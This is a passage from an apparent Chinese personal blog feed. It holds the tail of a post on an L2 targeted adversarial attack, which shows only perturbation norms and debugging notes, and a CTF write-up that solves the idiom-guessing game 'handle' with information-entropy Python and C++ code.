axis=<span class="number">1</span>)</span><br><span class="line">&gt;&gt; array([<span class="number">4.09481434</span>, <span class="number">4.2946097</span> , <span class="number">6.64396102</span>, <span class="number">5.90332629</span>, <span class="number">6.05583615</span>,</span><br><span class="line">       <span class="number">5.71162228</span>, <span class="number">6.26226203</span>, <span class="number">3.06447416</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 均值</span></span><br><span class="line">np.<span class="built_in">sum</span>(np.linalg.norm(np.array([np.array(i).ravel() <span class="keyword">for</span> i <span class="keyword">in</span> pert]), axis=<span class="number">1</span>)) / <span class="number">8</span></span><br><span class="line">&gt;&gt; <span class="number">5.2538632468131485</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Linf</span></span><br><span class="line">np.linalg.norm(np.array([np.array(i).ravel() <span class="keyword">for</span> i <span class="keyword">in</span> pert]), <span class="built_in">ord</span>=np.inf, axis=<span class="number">1</span>)</span><br><span class="line">&gt;&gt; array([<span class="number">0.51915417</span>, <span class="number">0.6969855</span> , <span class="number">0.94458608</span>, <span class="number">0.8020708</span> , <span class="number">0.99483219</span>,</span><br><span class="line">       <span class="number">0.70698208</span>, <span class="number">1.12368025</span>, <span class="number">0.41853863</span>])</span><br></pre></td></tr></table></figure><p>宏观感受如下</p><img src="/images/L2TarAtt_Attacked.png"><p>对比Carlini的论文中的L2数据，我认为这样的结果是勉强可以接受的</p><h2 id="DumbAss"><a href="#DumbAss" class="headerlink" title="DumbAss"></a>DumbAss</h2><p>一开始还想着靠单纯的梯度下降直接，硬着提高target的自信度，但是导致的问题就是各种梯度消失梯度过缓之类的，比如我当时的<code>loss</code>是这样下降的</p><img src="/images/L2TarAtt_fig.png"><p>具体是把<code>6</code>识别成<code>7</code>的情景，范数如下，吃力不讨好了属于是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">L2  : <span class="number">8.161735079209715</span></span><br><span class="line">Linf: <span class="number">1.188402119264267</span></span><br></pre></td></tr></table></figure><p>在做这个L2 Targeted Attack的时候，最多的时间应该是浪费在以下这几件事上：</p><ul><li><code>float64</code>与<code>float32</code>在加载与储存的时候没有注意类型，导致不能及时与<code>tensorFlow</code>对答案</li><li><code>softMax</code>偏导的函数错误，导致最终偏导错误</li><li>文献查找，找到Carlini的这篇文章花了挺多时间的</li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HandleCrack</title>
      <link href="2022/03/23/HandleCrack/"/>
      <url>2022/03/23/HandleCrack/</url>
      
        <content type="html"><![CDATA[<p>虎符签到题handle，连官方wp都叫你直接随便选一个看起来过得去的就行，确实是handle里对于开头的成语基本没啥讲究，但是反正做都做了不如做完做好，于是就又花了些时间跟着3b1b的wordle视频做了个这，主要是<b>信息论</b>的应用和对C++的顺便实操</p><span id="more"></span><!--toc--><h1 id="HandleCrack-信息论"><a href="#HandleCrack-信息论" class="headerlink" title="HandleCrack[信息论]"></a>HandleCrack[信息论]</h1><p>为了文章长度尽量短点（懒），以下是我略过但读者应该知道的内容：</p><ul><li><a href="https://handle.antfu.me/">handle</a>和wordle的规则</li><li>E = ∑ -p_i * log(p_i)</li></ul><p>（直接去看一遍<a href="www.bilibili.com/video/BV1zZ4y1k7Jw">3b1b视频</a>多好，以及另一个<a href="www.bilibili.com/video/BV1A3411p7Xv">3b1b的补充说明</a>）</p><h2 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><p>&gt;&gt; 问：原题不是py吗怎么要扯cpp？</p><p>答：不会优化py所以我的cpp跑起来应该比py快（?），而且cpp的位操作和手动内存管理我看着要放心一点（执念（不要学我（呜</p><p>&gt;&gt; 问：不是随便选一个当开头词就可以了吗，为什么还要费这么大力气整这些？</p><p>答：一，看了wordle的视频自己也想实操一下；二，反正比赛都结束了不如做完善点；三，不求出来我会睡不着觉的。总之就是虽然确实根据最后的结果看来，只要选一个比较正常的成语，或者多试几个开头词，就能达到很好的效果了，但是我就是想做一下，因为挺有趣的</p><h2 id="题面"><a href="#题面" class="headerlink" title="题面"></a>题面</h2><p>Handle在4轮内找到答案，重复512次，每次的选词由<code>random.choice()</code>产生</p><p>然后就是他这个交互有点难受，由于你输入词语后它返回的拼音对错信息是以颜色标注的，虽然听群里说字节流下颜色可以比较方便的获取，但是反正后面我复现的时候是没有管这个的</p><p><a href="https://kyriota.com/html/DLfiles/%E8%99%8E%E7%AC%A6handle.zip">下载链接(github源)</a></p><h2 id="Handle杂谈"><a href="#Handle杂谈" class="headerlink" title="Handle杂谈"></a>Handle杂谈</h2><p>wordle是固定5个字母，每个字母框有三种情况，所以理论上总共的可能性是3^5种</p><p>handle是固定4个拼音，每个字的拼音分为声母，韵母，声调，所以可以看作是12个字母的wordle，也是每个拼音框有三种情况，理论可能性有3^12种</p><h3 id="特殊韵母"><a href="#特殊韵母" class="headerlink" title="特殊韵母"></a>特殊韵母</h3><p>但是中文中包含特殊韵母，比如 en，er，ei 等，一个韵母就是一个注音的字。那比如这一轮猜了读音为 en 的一个字，则不管才没猜对，都损失了一个位置上声母的信息，特别是 en，ei 这些可以和声母搭配，又可以自己来的特殊韵母，对于 er 而言，由于 er 不能和声母组合，会更特殊一点（顺便一提，py的拼音库得出的拼音不知为何对“了”这个字也没有音调，所以有些时候不止会在声母上为空，声调也有可能为空）</p><p>但是我已经不想思考了，所以我就把 er 和 en，ei 之类的同等处理的，也许把 er 再单独分出来又会稍微不一样一捏捏，但是我真的已经停止思考了</p><h3 id="词库"><a href="#词库" class="headerlink" title="词库"></a>词库</h3><p>其实我当时以为他题目没给代码，查了一下常用成语貌似也就几千个，我就去百度汉语扒了一个百度的成语词库，那也才4000个词啊，好家伙结果他给的那个列表有将近两万六千个词（？），看了一下是从<a href="https://github.com/antfu/handle">这里面</a>搬的，里面甚至有<b>“可口可乐”</b>之类的特别奇怪的东西，哈哈 (^ ^)</p><img src="/images/memes/TMDbloodpresure.jpg" height="100" width="100" /><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>这个exp里不包含对上面提到的特殊韵母的特殊处理，同时直接用的函数return的信息来反馈的，而<strong>不是题目环境下的颜色信息</strong></p><h3 id="吐槽"><a href="#吐槽" class="headerlink" title="吐槽"></a>吐槽</h3><p>exp的思路很简单，的确只需要比较随便的选择开局的词语就可以了，甚至第一个词“一丁不识”在最后算出来的信息熵排名里面都很靠前，只要不是“可口可乐”这种奇怪的词，就可以在运气的加持下直接出flag，说实话这个flag是必须要运气的，因为就算是我最后算出来的信息熵最高的词他也不能保证4轮出结果，我得到的平均轮次大概是2.62轮（和题目条件一样随机抽取测试512次），而被我目击到的最大轮次是6轮，虽然我写的这个脚本优化比较烂，但是还是不影响我说：这个题他应该看你到最后的平均轮次是否合格，而不是看最大轮次 = =</p><p>在的<a href="https://mp.weixin.qq.com/s?__biz=MzU5Njg1NzMyNw==&mid=2247484500&idx=1&sn=35e43e11b29119544045fa7dfd56c10a&chksm=fe5d1cd4c92a95c208c93921a0b8f328cb92daf0630bc8a5ed7eaaafc30500fc44768beb0b6f&mpshare=1&scene=23&srcid=0324Ct2tOV94yqxYEa60Rbey&sharer_sharetime=1648094683578&sharer_shareid=c69a4128c20e54a8749107dca4adf514#rd">官方wp</a>里对他自己的exp表示：</p><blockquote><p>这个脚本也不是必成功，但是体感成功率非常高，平均猜词次数 2.72，也许换个起始词可以把最大次数压到 3</p></blockquote><p>哥你得有数据啊不要凭感觉啊，出题人可能是觉得他随便选了个词就可以把平均猜词数压倒2.72，所以优化一下应该能轻松压得很低，但是问题就是其实这些词语的信息熵的分布总体来看都算是比较高的了，总共不到2.6w个词，2.1w个词的信息熵在10以上，最高的信息熵也就12.8755，意思是你随便选中那2.1w个信息熵在10以上的词的时候，理论上剩下的词数的期望就只有25.3个，但3b1b讲wordle的视频里有句话说得好，就，“期望是期望，实际是实际”（大概是这个意思），所以还是那句话，最好就存一下选手的轮次信息，最后算一下平均轮次够不够小</p><p>在我抽的512抽里面大概是这么个分布</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">猜中轮次 -| 一发入魂 |    2    |    3    |    4    |    5    |    6    |</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">发生次数 -|    1    |   230   |   247   |   32    |    1    |    1    |</span><br></pre></td></tr></table></figure><img src="/images/handle_bar.png"/><h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><p>挺无脑的，py水平有限，有些地方不太优雅</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        exp    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">initials, finals, tones = [], [], []</span><br><span class="line"><span class="comment"># 预先存了一下拼音</span></span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> idioms:</span><br><span class="line">    pinyin = get_pinyin(word)</span><br><span class="line">    initials.append(pinyin[<span class="number">0</span>])</span><br><span class="line">    finals.append(pinyin[<span class="number">1</span>])</span><br><span class="line">    tones.append(pinyin[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetWord</span>(<span class="params">words</span>):</span></span><br><span class="line">    <span class="comment"># 根据 E 得出当前最优词</span></span><br><span class="line">    wordLen = <span class="built_in">len</span>(words)</span><br><span class="line">    <span class="keyword">if</span> wordLen &gt; <span class="number">25000</span>: <span class="comment"># 开头词固定</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;研经铸史&quot;</span></span><br><span class="line">    E = []</span><br><span class="line">    <span class="keyword">for</span> guessIndex <span class="keyword">in</span> <span class="built_in">range</span>(wordLen): <span class="comment"># 无脑遍历算 E</span></span><br><span class="line">        partern, count, prob = [], [], []</span><br><span class="line">        <span class="keyword">for</span> ansIndex <span class="keyword">in</span> <span class="built_in">range</span>(wordLen):</span><br><span class="line">            result = []</span><br><span class="line">            result.append(check_part(initials[guessIndex],initials[ansIndex]))</span><br><span class="line">            result.append(check_part(finals[guessIndex],finals[ansIndex]))</span><br><span class="line">            result.append(check_part(tones[guessIndex],tones[ansIndex]))</span><br><span class="line">            findFlag = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(partern)):</span><br><span class="line">                <span class="keyword">if</span> partern[i] == result:</span><br><span class="line">                    count[i] += <span class="number">1</span></span><br><span class="line">                    findFlag = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> findFlag:</span><br><span class="line">                partern.append(result)</span><br><span class="line">                count.append(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(partern)):</span><br><span class="line">            p = count[i] / wordLen</span><br><span class="line">            prob.append(-p * log2(p))</span><br><span class="line">        E.append(<span class="built_in">sum</span>(prob))</span><br><span class="line">        print(<span class="string">&quot;\r&gt;&gt; E: &quot;</span> + <span class="built_in">str</span>(guessIndex), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    print(<span class="string">&quot;\n&gt;&gt; max E: &quot;</span> + <span class="built_in">str</span>(<span class="built_in">max</span>(E)))</span><br><span class="line">    <span class="keyword">return</span> words[argmax(E)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DeleteWord</span>(<span class="params">words, result, guess</span>):</span></span><br><span class="line">    <span class="comment"># 把不符合反馈 partern 的词删掉</span></span><br><span class="line">    certain = []</span><br><span class="line">    uncertain = []</span><br><span class="line">    wrong = []</span><br><span class="line">    pinyin = get_pinyin(guess)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> result[i][j] == status.OK:</span><br><span class="line">                certain.append([pinyin[i][j],(i,j)])</span><br><span class="line">            <span class="keyword">elif</span> result[i][j] == status.MISS:</span><br><span class="line">                uncertain.append([pinyin[i][j],(i,j)])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                wrong.append([pinyin[i][j],(i,j)])</span><br><span class="line">    newWords = []</span><br><span class="line">    <span class="keyword">for</span> wordIndex <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(words)):</span><br><span class="line">        pinyin = get_pinyin(words[wordIndex])</span><br><span class="line">        flag = <span class="literal">True</span> <span class="keyword">and</span> words[wordIndex] != guess</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> certain:</span><br><span class="line">            <span class="keyword">if</span> pinyin[i[<span class="number">1</span>][<span class="number">0</span>]][i[<span class="number">1</span>][<span class="number">1</span>]] != i[<span class="number">0</span>]:</span><br><span class="line">                flag = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> uncertain:</span><br><span class="line">            <span class="keyword">if</span> i[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> pinyin[i[<span class="number">1</span>][<span class="number">0</span>]] <span class="keyword">or</span> i[<span class="number">0</span>] == pinyin[i[<span class="number">1</span>][<span class="number">0</span>]][i[<span class="number">1</span>][<span class="number">1</span>]]:</span><br><span class="line">                flag = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> wrong:</span><br><span class="line">            <span class="keyword">if</span> i[<span class="number">0</span>] <span class="keyword">in</span> pinyin[i[<span class="number">1</span>][<span class="number">0</span>]]:</span><br><span class="line">                wrongCnt = pinyin[i[<span class="number">1</span>][<span class="number">0</span>]].count(i[<span class="number">0</span>])</span><br><span class="line">                certainCnt, uncertainCnt = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> certain:</span><br><span class="line">                    certainCnt += j.count(i[<span class="number">0</span>])</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> uncertain:</span><br><span class="line">                    uncertainCnt += j.count(i[<span class="number">0</span>])</span><br><span class="line">                <span class="keyword">if</span> wrongCnt &lt;= certainCnt + uncertainCnt:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                flag = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        newWords.append(words[wordIndex])</span><br><span class="line">    <span class="keyword">return</span> newWords</span><br></pre></td></tr></table></figure>    </div></div><h2 id="最优开头"><a href="#最优开头" class="headerlink" title="最优开头"></a>最优开头</h2><p>我其实之前想过能不能直接构造一个最优开头，但是没什么思路，就决定从他给出的2.6w个词里面找一个最优开头</p><p>由于文章一开头说的优化问题，所以我就<code>py2cpp()</code>了</p><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>首先我把所有词的拼音都通过py的拼音库导出到了硬盘，无韵母无声调的地方用“#”进行了占位，然后为了之后不再重复统计一个词另一个词比较得出的pattern，我把所有partern导出，这样之后查表就完事了</p><p>这一块值得注意的应该也就是pattern的<strong>存储格式</strong>了</p><p>因为每一个拼音位有4种情况：确定存在且位置正确，确定存在但位置错误，确定不存在，不确定是否存在（特殊韵母）；而总共4个汉字，每个汉字3个拼音位，由于状态共4种，两位就能表示完（00，01，10，11），总共需要<code>4 * 3 * 2 = 24(bit)</code>，刚好3字节，所以用3个<code>char</code>就可以塞下1个pattern，这部分详见下方折叠代码中的<code>CalPattern()</code></p><div class='spoiler collapsed'>    <div class='spoiler-title'>        crackGen.cpp    </div>    <div class='spoiler-content'>        <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 26352</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//========================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ZHword</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="built_in">string</span> pinyin[<span class="number">12</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//========================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitZHWords</span><span class="params">(<span class="built_in">list</span>&lt;ZHword&gt; &amp;words)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 读取 py 生成的拼音</span></span><br><span class="line">    ifstream f_ini(&quot;initials.txt&quot;), f_fin(&quot;finals.txt&quot;), f_ton(&quot;tones.txt&quot;);</span><br><span class="line">    <span class="built_in">string</span> str_ini, str_fin, str_ton; <span class="comment">// 声母 韵母 音调</span></span><br><span class="line">    <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    ZHword wordTemp;</span><br><span class="line">    <span class="keyword">while</span> (f_ini &gt;&gt; str_ini &amp;&amp; f_fin &gt;&gt; str_fin &amp;&amp; f_ton &gt;&gt; str_ton)</span><br><span class="line">    &#123;</span><br><span class="line">        wordTemp.pinyin[cnt % <span class="number">4</span> * <span class="number">3</span>] = str_ini;</span><br><span class="line">        wordTemp.pinyin[cnt % <span class="number">4</span> * <span class="number">3</span> + <span class="number">1</span>] = str_fin;</span><br><span class="line">        wordTemp.pinyin[cnt % <span class="number">4</span> * <span class="number">3</span> + <span class="number">2</span>] = str_ton;</span><br><span class="line">        <span class="keyword">if</span> (!(++cnt % <span class="number">4</span>))</span><br><span class="line">            words.push_back(wordTemp);</span><br><span class="line">    &#125;</span><br><span class="line">    f_ini.close();</span><br><span class="line">    f_fin.close();</span><br><span class="line">    f_ton.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//========================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">CalPattern</span><span class="params">(ZHword guess, ZHword answer, <span class="keyword">char</span> *pattern)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 计算 guess 与 answer 比对的 pattern, 并存入参数中的 pattern</span></span><br><span class="line">    <span class="built_in">list</span>&lt;<span class="built_in">string</span>&gt; miss;</span><br><span class="line">    <span class="built_in">list</span>&lt;<span class="built_in">string</span>&gt;::iterator iterMiss;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (guess.pinyin[i] == <span class="string">&quot;#&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            pattern[i % <span class="number">3</span>] |= <span class="number">3</span> &lt;&lt; (<span class="number">3</span> - i / <span class="number">3</span>) * <span class="number">2</span>; <span class="comment">// unknown =&gt; 11</span></span><br><span class="line">            miss.push_back(answer.pinyin[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (guess.pinyin[i] != answer.pinyin[i])</span><br><span class="line">            miss.push_back(answer.pinyin[i]);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            pattern[i % <span class="number">3</span>] |= <span class="number">2</span> &lt;&lt; (<span class="number">3</span> - i / <span class="number">3</span>) * <span class="number">2</span>; <span class="comment">// certain =&gt; 10</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (miss.empty())</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> marked = <span class="keyword">int</span>(pattern[i % <span class="number">3</span>] &gt;&gt; ((<span class="number">3</span> - i / <span class="number">3</span>) * <span class="number">2</span>) &amp; <span class="keyword">char</span>(<span class="number">0x3</span>));</span><br><span class="line">        <span class="keyword">if</span> (marked)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">for</span> (iterMiss = miss.begin(); iterMiss != miss.end(); iterMiss++)</span><br><span class="line">            <span class="keyword">if</span> (guess.pinyin[i] == *iterMiss)</span><br><span class="line">            &#123;</span><br><span class="line">                pattern[i % <span class="number">3</span>] |= <span class="number">1</span> &lt;&lt; (<span class="number">3</span> - i / <span class="number">3</span>) * <span class="number">2</span>; <span class="comment">// uncertain =&gt; 01</span></span><br><span class="line">                miss.erase(iterMiss);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">// wrong =&gt; 00</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//========================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *patternsHead[MAXSIZE];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MAXSIZE; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> *patterns = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">3</span> * MAXSIZE]();</span><br><span class="line">        patternsHead[i] = patterns;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">list</span>&lt;ZHword&gt; zh_words;</span><br><span class="line">    <span class="built_in">list</span>&lt;ZHword&gt;::iterator guess, answer;</span><br><span class="line">    InitZHWords(zh_words);</span><br><span class="line">    <span class="keyword">int</span> cntGuess = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (guess = zh_words.begin(); guess != zh_words.end() &amp;&amp; cntGuess &lt; MAXSIZE; guess++, <span class="built_in">cout</span> &lt;&lt; cntGuess++ &lt;&lt; <span class="built_in">endl</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> cntAns = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (answer = zh_words.begin(); answer != zh_words.end(); answer++, cntAns++)</span><br><span class="line">            CalPattern(*guess, *answer, &amp;patternsHead[cntGuess][cntAns * <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function">ofstream <span class="title">f</span><span class="params">(<span class="string">&quot;patterns.dat&quot;</span>, ios::out | ios::binary)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> guessIndex = <span class="number">0</span>; guessIndex &lt; MAXSIZE; guessIndex++, <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;SAVE: &quot;</span> &lt;&lt; guessIndex &lt;&lt; <span class="built_in">endl</span>)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> ansIndex = <span class="number">0</span>; ansIndex &lt; MAXSIZE; ansIndex++)</span><br><span class="line">            f.write(&amp;patternsHead[guessIndex][ansIndex * <span class="number">3</span>], <span class="number">3</span>);</span><br><span class="line">    f.close();</span><br><span class="line">    zh_words.clear();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>    </div></div><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p>做好了patterns的准备工作，就可以开始求E了</p><p>对于<code>GetEntropy()</code>总共就三步：</p><ul><li>根据最大E猜词</li><li>求新的E</li><li>更新词库并回到第一步</li></ul><p>存储结构上要提一下，如果直接创建超大数组多半会segFault，所以我用的拉链法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> patterns[MAXSIZE][MAXSIZE * <span class="number">3</span>]; <span class="comment">// =&gt; Segment Fault</span></span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *patternsHead[MAXSIZE];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i 